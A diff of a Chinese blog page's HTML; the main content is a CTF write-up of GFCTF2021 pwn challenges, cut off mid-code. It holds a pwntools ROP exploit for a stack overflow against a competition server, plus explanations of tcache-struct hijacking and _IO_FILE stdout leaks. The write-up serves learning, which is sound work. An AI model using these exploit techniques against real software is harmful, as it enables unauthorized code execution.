@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,109 +190,119 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        GFCTF2021复现
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">GFCTF2021复现</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-01-11 18:55:31
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-01-11 18:55:31</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Thu Feb 10 2022 15:43:31 GMT+0800">2022-02-10 15:43:31</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。</p>
 <h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a><strong>shell</strong></h1><p>题目保护只开了nx，主函数也是很简单的栈溢出。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>但是问题是题目没有泄漏函数。所以这里存在一个冷知识</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111150232606.png"
-                      alt="image-20220111150232606"
-                ></p>
+<p><img   src="/images/image-20220111150232606.png"  alt="image-20220111150232606"></p>
 <p>system(“$0”)同样可以拿到shell</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111150356286.png"
-                      alt="image-20220111150356286"
-                ></p>
+<p><img   src="/images/image-20220111150356286.png"  alt="image-20220111150356286"></p>
 <p>在ida发现tip函数存在</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111150431403.png"
-                      alt="image-20220111150431403"
-                ></p>
+<p><img   src="/images/image-20220111150431403.png"  alt="image-20220111150431403"></p>
 <p>text段可以即可拿到shell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./shell&#x27;)</span></span><br><span class="line">r = remote(<span class="string">b&#x27;1.14.71.254&#x27;</span>, <span class="number">28087</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00000000004005e3</span></span><br><span class="line">shell_addr = <span class="number">0x400541</span></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(shell_addr) + \</span><br><span class="line">    p64(<span class="number">0x0000000000400416</span>)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -252,45 +312,20 @@
 <p>字面意思也就是攻击tcache结构体。</p>
 <p>在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。</p>
 <p>和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111151306312.png"
-                      alt="image-20220111151306312"
-                ></p>
+<p><img   src="/images/image-20220111151306312.png"  alt="image-20220111151306312"></p>
 <p>可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。</p>
 <p>(因为刚刚的0x80不具有演示效果我改了一下)</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111151720296.png"
-                      alt="image-20220111151720296"
-                ></p>
+<p><img   src="/images/image-20220111151720296.png"  alt="image-20220111151720296"></p>
 <p>可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。</p>
 <h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先利用double free</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111153652180.png"
-                      alt="image-20220111153652180"
-                ></p>
-<p>此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。</p>
+<p><img   src="/images/image-20220111153652180.png"  alt="image-20220111153652180"></p>
+<p>此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1&#x2F;16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。</p>
 <h2 id="IO-FILE-leak"><a href="#IO-FILE-leak" class="headerlink" title="_IO_FILE leak"></a>_IO_FILE leak</h2><p>在我的这一篇博客提到过_IO_FILE write <a class="link"   target="_blank" rel="noopener" href="https://cv196082.gitee.io/2021/12/06/echo-back/" >https://cv196082.gitee.io/2021/12/06/echo-back/<i class="fas fa-external-link-alt"></i></a> 不了解结构体可以先去看一下。</p>
 <p>当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 <a class="link"   target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/archives/95/" >https://blog.wjhwjhn.com/archives/95/<i class="fas fa-external-link-alt"></i></a></p>
 <p>我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111161304428.png"
-                      alt="image-20220111161304428"
-                ></p>
+<p><img   src="/images/image-20220111161304428.png"  alt="image-20220111161304428"></p>
 <p>这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111163346092.png"
-                      alt="image-20220111163346092"
-                ></p>
+<p><img   src="/images/image-20220111163346092.png"  alt="image-20220111163346092"></p>
 <p>我们需要修改的是<code>_flags</code>和<code>_IO_write_base</code>，在这之间的三个指针，我们覆盖<code>_IO_write_base</code>势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。</p>
 <p>copy:解释以上指针的作用</p>
 <blockquote>
@@ -305,11 +340,11 @@
 <p>其中检查较为重要的是<code>_IO_new_file_overflow</code>函数。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /</span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>_IO_NO_WRITES</code>使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个<code>_IO_NO_WRITES</code>在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 <strong>(f-&gt;_flags &amp; _IO_NO_WRITES)==0</strong></p>
+<p><code>_IO_NO_WRITES</code>使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个<code>_IO_NO_WRITES</code>在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 <strong>(f-&gt;_flags &amp; _IO_NO_WRITES)&#x3D;&#x3D;0</strong></p>
 <p>后面检测<code>_IO_CURRENTLY_PUTTING</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">    logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">    read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">    makes room for subsequent output.</span></span><br><span class="line"><span class="comment">    Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">    alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>主要关心的是<code>_IO_CURRENTLY_PUTTING</code>，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的<code>_IO_write_base</code>会被修改那就达不到泄漏的目的，所以我们要满足 <strong>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1</strong></p>
+<p>主要关心的是<code>_IO_CURRENTLY_PUTTING</code>，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的<code>_IO_write_base</code>会被修改那就达不到泄漏的目的，所以我们要满足 <strong>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)&#x3D;&#x3D;1</strong></p>
 <p>最后一个检测</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">    count = new_do_write (f, s, do_write);</span><br><span class="line">    to_do -= count;</span><br><span class="line">    <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -326,12 +361,7 @@
 <p>计算可得，<code>fp-&gt;_flags = 0xfbad1800</code>, 其中<code>_IO_MAGIC = 0xfdab0000</code>，这是个 Magic Number，是固定的。</p>
 <h3 id="一般的利用方式"><a href="#一般的利用方式" class="headerlink" title="一般的利用方式"></a>一般的利用方式</h3><p>一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出<code>_IO_2_1_stdout_</code>结构体的位置，随后就是根据上面得出来的值得到<code>_IO_2_1_stdout_</code>的地址来获取libc</p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>有了以上的基础我们才可以正式开始看这道题目。</p>
-<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111174241863.png"
-                      alt="image-20220111174241863"
-                ></p>
+<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img   src="/images/image-20220111174241863.png"  alt="image-20220111174241863"></p>
 <p>保护全开，好样的！</p>
 <h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-498h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-494h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1160</span>]; <span class="comment">// [rsp+10h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+498h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cont...&quot;</span>);</span><br><span class="line">  v2 = read(<span class="number">0</span>, s, <span class="number">0x78</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">112</span> 